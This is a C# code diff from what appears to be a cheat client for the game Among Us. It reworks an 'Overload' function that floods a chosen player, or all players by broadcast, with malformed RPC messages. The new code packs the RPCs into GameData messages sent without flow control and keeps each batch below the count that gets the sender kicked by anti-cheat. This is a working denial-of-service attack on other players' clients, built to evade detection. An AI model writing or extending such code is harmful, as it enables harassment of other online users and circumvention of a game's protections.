@@ -261,9 +261,27 @@ public static class Utils
         }
     }
 
+    // Returns the max number of nested RPCs that can be in a GameData message
+    // without getting kicked by AC
+    public static int GetMaxRpcPackingLimit()
+    {
+        int num = 0;
+
+        if (isClient && AmongUsClient.Instance.AmHost)
+        {
+            num = GameManager.Instance.LogicOptions.MaxPlayers * 2;
+        }
+
+        return 10 + num;
+    }
+
     // Overloads target with set strength using malformed RPCs
     public static void Overload(int targetId, int strength)
     {
+        if (strength < 1) return;
+
+        int maxRpc = GetMaxRpcPackingLimit();
+
         // ClimbLadder RPC is only effective in maps with no ladders or in lobby
         // SetStartCounter RPC is only effective when NOT in lobby
 
@@ -272,10 +290,49 @@ public static class Utils
         uint netId = hasLadders ? PlayerControl.LocalPlayer.NetId : PlayerControl.LocalPlayer.MyPhysics.NetId;
         byte rpcCall = hasLadders ? (byte)RpcCalls.SetStartCounter : (byte)RpcCalls.ClimbLadder;
 
-        for (int i = 0; i < strength; i++) // Strength = Num of malformed RPCs sent
+        if (strength <= maxRpc)
         {
-            MessageWriter overloadMsg = AmongUsClient.Instance.StartRpcImmediately(netId, rpcCall, SendOption.None, targetId);
-            AmongUsClient.Instance.FinishRpcImmediately(overloadMsg);
+            // SendOption.None has no flow control, allowing for flooding without limits
+
+            var messageWriter = MessageWriter.Get(SendOption.None);
+
+            if (targetId < 0) // -1 = Broadcast
+            {
+                messageWriter.StartMessage(Tags.GameData);
+                messageWriter.Write(AmongUsClient.Instance.GameId);
+            }
+            else
+            {
+                messageWriter.StartMessage(Tags.GameDataTo);
+                messageWriter.Write(AmongUsClient.Instance.GameId);
+                messageWriter.WritePacked(targetId);
+            }
+
+            for (var msg = 0; msg < strength; msg++)
+            {
+                messageWriter.StartMessage((byte)GameDataTypes.RpcFlag);
+                messageWriter.WritePacked(netId);
+                messageWriter.Write(rpcCall);
+                messageWriter.EndMessage();
+            }
+
+            messageWriter.EndMessage();
+
+            AmongUsClient.Instance.connection.Send(messageWriter);
+
+            messageWriter.Recycle();
+        }
+        else
+        {
+            int strengthGroups = strength / maxRpc;
+            int remainder = strength % maxRpc;
+
+            for (int group = 0; group < strengthGroups; group++)
+            {
+                Overload(targetId, maxRpc);
+            }
+
+            Overload(targetId, remainder);
         }
     }
 
